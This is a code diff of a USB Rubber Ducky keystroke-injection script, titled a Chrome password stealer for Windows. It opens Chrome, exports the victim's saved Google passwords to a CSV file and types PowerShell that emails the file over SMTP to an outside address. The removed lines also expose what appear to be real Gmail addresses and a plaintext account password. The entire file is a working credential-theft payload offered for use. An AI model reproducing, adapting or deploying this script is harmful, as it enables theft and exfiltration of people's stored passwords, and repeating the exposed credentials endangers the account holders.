@@ -1,29 +1,31 @@
 REM
-REM     _____              __                            
-REM    /  _  \     ____  _/  |_                          
-REM   /  /_\  \   / ___\ \   __\                         
-REM  /    |    \ / /_/  > |  |                           
-REM  \____|__  / \___  /  |__|                           
-REM          \/ /_____/                                  
-REM    _________.__                 .___                 
+REM     _____              __
+REM    /  _  \     ____  _/  |_
+REM   /  /_\  \   / ___\ \   __\
+REM  /    |    \ / /_/  > |  |
+REM  \____|__  / \___  /  |__|
+REM          \/ /_____/
+REM    _________.__                 .___
 REM   /   _____/|  |__  _____     __| _/  ____  __  _  __
 REM   \_____  \ |  |  \ \__  \   / __ |  /  _ \ \ \/ \/ /
-REM   /        \|   Y  \ / __ \_/ /_/ | (  <_> ) \     / 
-REM  /_______  /|___|  /(____  /\____ |  \____/   \/\_/  
-REM          \/      \/      \/      \/                  
-REM Author: AgtShadow
-REM Ducky chrome password stealer for Windows 11
-REM Revision Version 1.3
-REM November 15th, 2021
+REM   /        \|   Y  \ / __ \_/ /_/ | (  <_> ) \     /
+REM  /_______  /|___|  /(____  /\____ |  \____/   \/\_/
+REM          \/      \/      \/      \/
+REM ### Author: AgtShadow
+REM ### USB Rubber Ducky modified Google Chrome Browser Password Stealer
+REM ### Revision Version 1.3
+REM ### Navigates to https://passwords.google.com/options?ep=1, and exports the passwords in .csv format
+REM ### And also emails to a proxy email address
+REM ### November 15th, 2021
 DELAY 1000
-REM ----------- opens chrome web browser
+REM ### Opens Chrome Browser
 GUI r
 DELAY 500
 STRING chrome
 DELAY 400
 ENTER
 DELAY 600
-REM ----------- exports passwords into csv file
+REM ### exports passwords into csv file
 STRING https://passwords.google.com/options?ep=1
 ENTER
 DELAY 1000
@@ -55,7 +57,7 @@ ENTER
 DELAY 200
 ENTER
 DELAY 1500
-STRING Darklotuspod98$%96$$%%Lotuspod9898
+STRING ### email receiver password goes here
 DELAY 1000
 ENTER
 DELAY 1000
@@ -78,17 +80,18 @@ DELAY 100
 STRING $SMTPInfo.EnableSSL = $true
 ENTER
 DELAY 100
+REM ### Kept from original payload file
 REM ---Make sure to enable less secure app access to sender's mail here: https://myaccount.google.com/lesssecureapps
-STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('atmosphere9999@gmail.com', 'Darklotuspod98$%96$$%%Lotuspod9898')
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('exmple@gmail.com', 'Google/Gmail Password')
 ENTER
 DELAY 100
 STRING $SMTPServer = $E = New-Object System.Net.Mail.MailMessage
 ENTER
 DELAY 100
-STRING $E.From = 'spragginsdesigns@gmail.com'
+STRING $E.From = 'receiver@gmail.'
 ENTER
 DELAY 100
-STRING $E.To.Add('spragginsdesigns@gmail.com')
+STRING $E.To.Add('receiver@gmail.com')
 ENTER
 DELAY 100
 STRING $E.Subject = $env:UserName
